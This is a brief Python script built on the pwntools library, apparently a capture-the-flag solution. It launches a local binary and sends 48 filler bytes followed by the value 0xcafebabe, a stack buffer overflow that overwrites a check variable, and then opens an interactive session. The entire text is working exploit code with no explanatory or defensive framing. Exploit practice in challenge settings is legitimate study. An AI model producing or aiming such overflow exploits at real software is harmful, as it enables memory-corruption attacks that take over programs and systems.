from pwn import *

def conn(): 
  return process(args.BINARY)

def solve(): 
  p = conn()
  p.sendline("A"*48 + "\xbe\xba\xfe\xca")
  p.interactive()

solve()